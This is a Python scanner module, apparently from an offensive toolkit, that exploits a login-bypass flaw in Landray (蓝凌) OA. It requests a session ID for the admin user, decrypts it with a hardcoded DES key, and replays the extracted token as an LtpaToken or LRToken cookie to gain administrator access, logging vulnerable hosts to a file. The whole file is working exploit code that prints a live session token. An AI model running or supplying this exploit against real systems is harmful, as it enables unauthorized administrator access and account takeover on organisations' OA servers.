from Crypto.Cipher import DES
from Crypto.Util.Padding import unpad
from base64 import b64decode
import requests,urllib3
import base64
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class Lanling_getLoginSessionId_login_bypass_Scan:
	def base64_decoding(self,string):
		string=base64.b64decode(string)
		return string.decode()
	def des_decrypt(self,ciphertext, key):
		# 使用base64解码密文
		ciphertext = b64decode(ciphertext)

		# 创建DES解密器对象
		cipher = DES.new(key, DES.MODE_ECB)

		# 解密密文并移除填充
		plaintext = unpad(cipher.decrypt(ciphertext), DES.block_size)

		return plaintext.decode('utf-8')

	def scan(self,baseurl):
		url=baseurl+'api/sys-authentication/loginService/getLoginSessionId.html'
		headers={
		'User-Agent': self.header,
		'Content-Type': 'application/x-www-form-urlencoded'
		}
		body='loginName=admin'
		response=requests.post(url,body,headers=headers,timeout=8,verify=self.ssl,proxies=self.proxy)
		# print(response.text)
		enc_data=response.json()['sessionId']
		des_data=self.base64_decoding(enc_data)
		data=self.des_decrypt(des_data,b'kmssSecu')
		token=data.split('id=')[1]
		tokenname_list=['LtpaToken','LRToken']
		for tokenname in tokenname_list:
			url=baseurl+'sys'
			headers={
			'User-Agent': self.header,
			'Cookie': tokenname+'='+token}
			response=requests.get(url,headers=headers,timeout=8,verify=self.ssl,proxies=self.proxy,allow_redirects=False)
			if 'anonym' not in response.headers['Location']:
				return	tokenname,token
		return False,False
	def main(self,target):
		self.batch = target["batch_work"]
		url=target["url"].strip("/ ")
		self.ssl = target["ssl"]
		self.header = target["header"]
		proxy = target["proxy"]
		_, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)


		if url[-1]!='/':
			url+='/'
		if not self.batch:
			OutPrintInfo("LanLing", '开始检测蓝凌OA-Login-Bypass...')
		tokenname,token=self.scan(url)
		if not self.batch:
			print(tokenname+'='+token)
		if not tokenname:
			if not self.batch:
				OutPrintInfo("LanLing",f'{url}不存在漏洞！')

		else:
			OutPrintInfoSuc("LanLing", f'目标{url} 存在漏洞！')
			if self.batch:
				with open("./result/lanling_getlogin_bypass.txt","a") as w:
					w.write(f"{url}\n")

		if not self.batch:
			OutPrintInfo("LanLing", '蓝凌OA-Login-Bypass检测结束')

